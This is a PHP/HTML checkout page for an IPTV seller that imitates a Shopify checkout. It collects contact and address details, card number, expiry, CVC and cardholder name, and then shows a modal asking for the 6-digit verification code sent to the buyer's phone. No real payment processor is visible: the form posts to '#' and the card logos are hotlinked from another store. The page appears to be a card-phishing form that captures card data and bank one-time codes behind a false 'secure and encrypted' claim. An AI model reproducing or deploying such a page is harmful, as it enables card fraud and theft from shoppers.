<?php

declare(strict_types=1);

session_start();

$config = require __DIR__ . '/../config/config.php';
/** @var PDO $pdo */
$pdo = require __DIR__ . '/../config/database.php';

logVisit($pdo);

$settings = getSettings($pdo);
$themeVars = getActiveThemeVars($settings['active_theme'] ?? 'onyx');
$brandTitleSetting = trim($settings['brand_title'] ?? '');
$brandName = $brandTitleSetting !== '' ? $brandTitleSetting : ($config['brand_name'] ?? 'ABDO IPTV CANADA');
$brandTaglineSetting = trim($settings['brand_tagline'] ?? '');
$brandTagline = $brandTaglineSetting !== '' ? $brandTaglineSetting : 'Ultra IPTV à Canada';
$brandLogoDesktop = trim($settings['brand_logo_desktop'] ?? '');
$brandLogoMobile = trim($settings['brand_logo_mobile'] ?? '');
if ($brandLogoMobile === '' && $brandLogoDesktop !== '') {
    $brandLogoMobile = $brandLogoDesktop;
}
$supportWhatsappNumber = trim($settings['support_whatsapp_number'] ?? '') ?: ($config['whatsapp_number'] ?? '');

$offerId = isset($_GET['offer']) ? max(0, (int) $_GET['offer']) : 0;
$selectedOffer = null;
if ($offerId > 0) {
    $stmt = $pdo->prepare('SELECT * FROM offers WHERE id = :id LIMIT 1');
    $stmt->execute(['id' => $offerId]);
    $selectedOffer = $stmt->fetch(PDO::FETCH_ASSOC) ?: null;
}

if (!$selectedOffer) {
    $offers = fetchAllAssoc($pdo, 'SELECT * FROM offers ORDER BY is_featured DESC, price ASC');
    $selectedOffer = $offers[0] ?? null;
}

if (!$selectedOffer) {
    $selectedOffer = [
        'id' => 0,
        'name' => 'IPTV Premium Pack',
        'duration' => '12 mois illimité',
        'price' => 108.00,
        'features' => "Activation en moins de 10 minutes\nSupport WhatsApp FR/AR/EN\n+40K chaînes & VOD",
        'description' => 'Plan recommandé lorsque les offres ne sont pas encore configurées.',
    ];
}

$offerName = $selectedOffer['name'] ?? 'IPTV Premium Pack';
$offerDuration = $selectedOffer['duration'] ?? '12 mois illimité';
$offerPrice = formatCurrency((float) ($selectedOffer['price'] ?? 0));
$offerDescription = trim($selectedOffer['description'] ?? '') ?: 'Confirme ton plan premium et reçois l’activation en 5-7 minutes.';
$offerFeatures = splitFeatures($selectedOffer['features'] ?? '');
$whatsappLink = getWhatsappLink($supportWhatsappNumber, $offerName, (float) ($selectedOffer['price'] ?? 0), $offerDuration);

$basePath = appBasePath();
$mediaBase = $basePath . '/assets/images/demo';
$posterFallback = $mediaBase . '/kfp4.webp';
$posterImage = $posterFallback;
$posterStmt = $pdo->query('SELECT image_url FROM movie_posters ORDER BY created_at DESC LIMIT 1');
$posterRow = $posterStmt->fetch(PDO::FETCH_ASSOC);
if ($posterRow && !empty($posterRow['image_url'])) {
    $posterImage = $posterRow['image_url'];
}

$seoTitle = 'Paiement - ' . $offerName . ' | ' . $brandName;
$seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration . ') avec un checkout façon Shopify.';

?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= e($seoTitle) ?></title>
    <meta name="description" content="<?= e($seoDescription) ?>">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="<?= $basePath ?>/assets/css/style.css?v=<?= time() ?>">
    <style>
        :root {
            <?php foreach ($themeVars as $var => $value): ?>
            <?= $var ?>: <?= e($value) ?>;
            <?php endforeach; ?>
        }
    </style>
</head>
<body class="checkout-page">
    <div class="noise"></div>
    <main class="checkout-main">
        <section class="payment-checkout" data-animate>
            <div class="payment-card">
                <div class="payment-column payment-column--primary">
                    <div class="checkout-offer-info">
                        <div>
                            <strong><?= e($offerName) ?></strong>
                            <span><?= e($offerDuration) ?></span>
                        </div>
                        <span class="price-tag">$<?= e($offerPrice) ?></span>
                    </div>
                    <form class="checkout-form" action="#" method="post" novalidate>
                        <div class="form-head">
                            <h3>Contact information</h3>
                        </div>
                        <label>Email or mobile phone number
                            <input type="text" name="contact" placeholder="jane.doe@email.com" required>
                        </label>
                        <label class="checkbox">
                            <input type="checkbox" name="newsletter" checked>
                            <span>Email me with news and offers</span>
                        </label>
                        <div class="form-head">
                            <h3>Delivery method</h3>
                        </div>
                        <div class="delivery-options">
                            <label class="delivery-option">
                                <input type="radio" name="delivery" value="ship" checked>
                                <div class="delivery-option__details">
                                    <div>
                                        <strong>Ship</strong>
                                        <small>Activation digitale en 5-7 min</small>
                                    </div>
                                </div>
                            </label>
                            <label class="delivery-option">
                                <input type="radio" name="delivery" value="pickup">
                                <div class="delivery-option__details">
                                    <div>
                                        <strong>Pick up</strong>
                                        <small>Support WhatsApp ou e-mail</small>
                                    </div>
                                </div>
                            </label>
                        </div>
                        <div class="form-head">
                            <h3>Shipping address</h3>
                        </div>
                        <div class="inline-inputs">
                            <label>First name
                                <input type="text" name="first_name" placeholder="John">
                            </label>
                            <label>Last name
                                <input type="text" name="last_name" placeholder="Smith">
                            </label>
                        </div>
                        <label>Company (optional)
                            <input type="text" name="company" placeholder="ABDO IPTV">
                        </label>
                        <label>Address
                            <input type="text" name="address" placeholder="123 Av. du Mont-Royal">
                        </label>
                        <label>Apartment, suite, etc. (optional)
                            <input type="text" name="apartment" placeholder="Unit 302">
                        </label>
                        <label>City
                            <input type="text" name="city" placeholder="Montréal">
                        </label>
                        <div class="shipping-grid">
                            <label>Country/region
                                <select name="country">
                                    <option>Canada</option>
                                    <option>United States</option>
                                    <option>France</option>
                                </select>
                            </label>
                            <label>State / Province
                                <input type="text" name="state" placeholder="QC">
                            </label>
                            <label>ZIP / Postal code
                                <input type="text" name="zip" placeholder="H2X 1Y4">
                            </label>
                        </div>
                    <label>Phone
                        <input type="text" name="phone" placeholder="+1 514 555 0000">
                    </label>
                    <div class="payment-confirmation" hidden data-payment-confirmation>
                        <div class="confirmation-icon">✔</div>
                        <div>
                            <strong>Thank you!</strong>
                            <p>Confirmation #<span data-confirmation-code></span></p>
                        </div>
                    </div>
                    <div class="card-payment">
                        <div class="card-payment__head">
                            <div>
                                <span class="card-payment__label">Payment</span>
                                <p>All transactions are secure and encrypted.</p>
                            </div>
                            <div class="card-payment__icons">
                                <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/visa.sxIq5Dot.svg" alt="Visa" loading="lazy" width="38" height="24">
                                <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/mastercard.1c4_lyMp.svg" alt="Mastercard" loading="lazy">
                                <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/amex.Csr7hRoy.svg" alt="American Express" loading="lazy">
                                <span class="card-payment__more" tabindex="0">
                                    +5
                                    <span class="card-payment__popover" aria-hidden="true">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/discover.C7UbFpNb.svg" alt="Discover">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/jcb.BgZHqF0u.svg" alt="JCB">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/diners_club.B9hVEmwz.svg" alt="DINERS CLUB">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/unionpay.8M-Boq_z.svg" alt="UNIONPAY">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/elo.Clup5T29.svg" alt="Elo">
                                    </span>
                                </span>
                            </div>
                        </div>
                            <div class="card-payment__method">
                                <span class="card-payment__pill">
                                    <span class="dot"></span>
                                    Credit card
                                </span>
                            </div>
                        <div class="card-payment__grid">
                            <label class="card-input">
                                Card number
                                <div class="card-input__field">
                                    <input type="text" name="card_number" placeholder="1234 1234 1234 1234" data-card-number inputmode="numeric" autocomplete="cc-number" maxlength="19" pattern="[0-9 ]*">
                                    <span class="card-brand" data-card-brand hidden>
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/visa.sxIq5Dot.svg" alt="Card brand" loading="lazy" data-default-logo="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/visa.sxIq5Dot.svg">
                                    </span>
                                </div>
                                <small class="input-error" data-error="card_number"></small>
                            </label>
                            <div class="card-payment__row">
                                <label>
                                    Expiration date (MM / YY)
                                    <input type="text" name="expiry" placeholder="MM / YY" data-card-expiry inputmode="numeric" autocomplete="cc-exp" pattern="[0-9/ ]*">
                                    <small class="input-error" data-error="expiry">Enter a valid expiration date</small>
                                </label>
                                <label>
                                    Security code
                                    <input
                                        type="tel"
                                        name="cvc"
                                        placeholder="CVC"
                                        data-card-cvc
                                        inputmode="numeric"
                                        autocomplete="cc-csc"
                                        pattern="[0-9]*"
                                        maxlength="3"
                                        oninput="this.value=this.value.replace(/\\D/g,'').slice(0, this.maxLength || 3)"
                                    >
                                    <small class="input-error" data-error="cvc"></small>
                                </label>
                            </div>
                            <label>
                                Name on card
                                <input type="text" name="card_name" placeholder="Full name" data-card-name autocomplete="cc-name">
                                <small class="input-error" data-error="card_name"></small>
                            </label>
                        </div>
                    </div>
                    <div class="checkout-actions">
                        <button type="button" class="btn primary" data-card-submit>Pay now</button>
                        <a href="<?= $basePath ?>/#offres" class="link-light">Return to offers</a>
                    </div>
                </form>
            </div>
                <div class="payment-column payment-column--summary">
                    <div class="summary-card">
                        <div class="summary-item">
                            <div class="summary-thumb">
                                <img src="<?= e($posterImage) ?>" alt="<?= e($offerName) ?>">
                                <span class="summary-count">1</span>
                            </div>
                            <div>
                                <strong><?= e($offerName) ?></strong>
                                <small><?= e($offerDuration) ?></small>
                            </div>
                            <span class="summary-price">$<?= e($offerPrice) ?></span>
                        </div>
                        <label class="gift-input">
                            <span>Gift card or discount code</span>
                            <div>
                                <input type="text" name="discount" placeholder="Promo code">
                                <button type="button">Apply</button>
                            </div>
                        </label>
                        <div class="summary-line">
                            <span>Subtotal</span>
                            <span>$<?= e($offerPrice) ?></span>
                        </div>
                        <div class="summary-total">
                            <span>Total</span>
                            <div>
                                <small>CAD</small>
                                <strong>$<?= e($offerPrice) ?></strong>
                            </div>
                        </div>
                        <?php if ($offerFeatures): ?>
                            <div class="summary-features">
                                <p>Ce plan inclut :</p>
                                <ul>
                                    <?php foreach ($offerFeatures as $feature): ?>
                                        <li><?= e($feature) ?></li>
                                    <?php endforeach; ?>
                                </ul>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <footer class="checkout-footer">
        <p>© <?= date('Y') ?> <?= e($brandName) ?> — Paiement sécurisé.</p>
        <a href="<?= e(getWhatsappLink($supportWhatsappNumber, 'Support checkout')) ?>" target="_blank" rel="noopener">Besoin d’aide ? Écris-nous sur WhatsApp</a>
    </footer>

    <a class="whatsapp-float whatsapp-float--chat" href="<?= e($whatsappLink) ?>" target="_blank" rel="noopener" aria-label="WhatsApp">
        <svg viewBox="0 0 24 24" role="img" aria-hidden="true">
            <path fill="currentColor" d="M12 2a10 10 0 0 0-8.94 14.5L2 22l5.65-1.48A10 10 0 1 0 12 2zm0 1.8a8.2 8.2 0 0 1 6.69 12.85 8.2 8.2 0 0 1-9.34 2.59l-.27-.1-3.38.88.9-3.34-.17-.28A8.2 8.2 0 0 1 12 3.8zm3.66 5.04c-.2-.005-.49-.01-.77.48-.27.49-.9 1.4-.98 1.5-.08.1-.18.15-.32.08-.14-.07-.6-.22-1.14-.56-.84-.48-1.37-1.08-1.53-1.26-.16-.18-.02-.28.12-.41.12-.12.3-.32.42-.48.14-.16.18-.28.26-.46.08-.18.04-.35-.02-.48-.07-.13-.6-1.46-.82-2-.22-.54-.46-.48-.63-.48h-.54c-.17 0-.44.06-.67.31-.23.25-.88.86-.88 2.1 0 1.24.9 2.44 1.03 2.6.12.16 1.78 2.72 4.3 3.9.6.27 1.07.43 1.44.55.6.19 1.14.16 1.57.1.48-.07 1.48-.61 1.69-1.21.21-.6.21-1.12.15-1.21-.06-.09-.22-.14-.42-.15z"/>
        </svg>
    </a>
    <div class="otp-modal" hidden data-otp-modal>
        <div class="otp-modal__content">
            <h3>Secure verification</h3>
            <p>Enter the 6-digit code sent to your phone.</p>
            <input
                type="tel"
                maxlength="6"
                inputmode="numeric"
                pattern="[0-9]*"
                autocomplete="one-time-code"
                data-otp-input
                oninput="this.value=this.value.replace(/\\D/g,'').slice(0,6)"
            >
            <div class="otp-modal__actions">
                <button type="button" class="btn primary" data-otp-confirm>Confirm</button>
                <button type="button" class="btn ghost" data-otp-cancel>Cancel</button>
            </div>
            <small class="input-error" data-otp-error></small>
        </div>
    </div>
    <script>
        window.APP_THEME = <?= json_encode($settings['active_theme'] ?? 'onyx') ?>;
    </script>
    <script src="<?= $basePath ?>/assets/js/main.js?v=<?= time() ?>" defer></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const submitBtn = document.querySelector('[data-card-submit]');
            const otpModal = document.querySelector('[data-otp-modal]');
            const otpInput = document.querySelector('[data-otp-input]');
            const otpError = document.querySelector('[data-otp-error]');
            const otpCancel = document.querySelector('[data-otp-cancel]');
            const cvcInput = document.querySelector('[data-card-cvc]');
            if (!submitBtn || !otpModal) return;

            const digitsOnly = (value, limit) => value.replace(/\D/g, '').slice(0, limit);
            const requiredCvc = () => {
                if (!cvcInput) return 3;
                const dataVal = Number(cvcInput.dataset.requiredCvc || '');
                if (dataVal > 0) return dataVal;
                const maxAttr = Number(cvcInput.maxLength || '');
                return maxAttr > 0 ? maxAttr : 3;
            };

            const closeOtp = () => {
                otpModal.hidden = true;
                document.body.classList.remove('modal-open');
            };
            const updateCvcError = () => {
                if (!cvcInput || !cvcError) return;
                const needed = requiredCvc();
                const digits = cvcInput.value.replace(/\D/g, '').slice(0, needed);
                if (digits.length === needed || digits.length === 0) {
                    cvcError.textContent = '';
                    cvcError.style.display = 'none';
                    cvcInput.closest('label')?.classList.remove('has-error');
                } else {
                    cvcError.textContent = `Enter the ${needed}-digit security code`;
                    cvcError.style.display = 'block';
                    cvcInput.closest('label')?.classList.add('has-error');
                }
            };

            if (otpInput) {
                otpInput.addEventListener('beforeinput', (event) => {
                    if (event.data && /\D/.test(event.data)) {
                        event.preventDefault();
                    }
                });
                otpInput.addEventListener('keydown', (event) => {
                    if (!/^\d$/.test(event.key) && !['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(event.key)) {
                        event.preventDefault();
                    }
                });
                otpInput.addEventListener('input', () => {
                    const cleaned = digitsOnly(otpInput.value, 6);
                    if (otpInput.value !== cleaned) {
                        otpInput.value = cleaned;
                    }
                });
                otpInput.addEventListener('paste', (event) => {
                    event.preventDefault();
                    const data = (event.clipboardData || window.clipboardData)?.getData('text') || '';
                    otpInput.value = digitsOnly(data, 6);
                });
            }

            if (cvcInput) {
                cvcInput.addEventListener('beforeinput', (event) => {
                    if (event.data && /\D/.test(event.data)) {
                        event.preventDefault();
                    }
                });
                cvcInput.addEventListener('keydown', (event) => {
                    if (!/^\d$/.test(event.key) && !['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(event.key)) {
                        event.preventDefault();
                    }
                });
                cvcInput.addEventListener('input', () => {
                    const needed = requiredCvc();
                    const cleaned = digitsOnly(cvcInput.value, needed);
                    if (cvcInput.value !== cleaned) {
                        cvcInput.value = cleaned;
                    }
                });
                cvcInput.addEventListener('paste', (event) => {
                    event.preventDefault();
                    const data = (event.clipboardData || window.clipboardData)?.getData('text') || '';
                    cvcInput.value = digitsOnly(data, 4);
                });
            }

            submitBtn.addEventListener('click', () => {
                setTimeout(() => {
                    if (!otpModal.hidden) return;
                    if (submitBtn.getAttribute('aria-invalid') === 'true') return;
                    otpModal.hidden = false;
                    document.body.classList.add('modal-open');
                    if (otpInput) otpInput.focus();
                    if (otpError) otpError.textContent = '';
                }, 10);
            });

            otpCancel?.addEventListener('click', closeOtp);
            otpModal.addEventListener('click', (event) => {
                if (event.target === otpModal) {
                    closeOtp();
                }
            });
        });
    </script>
</body>
</html>
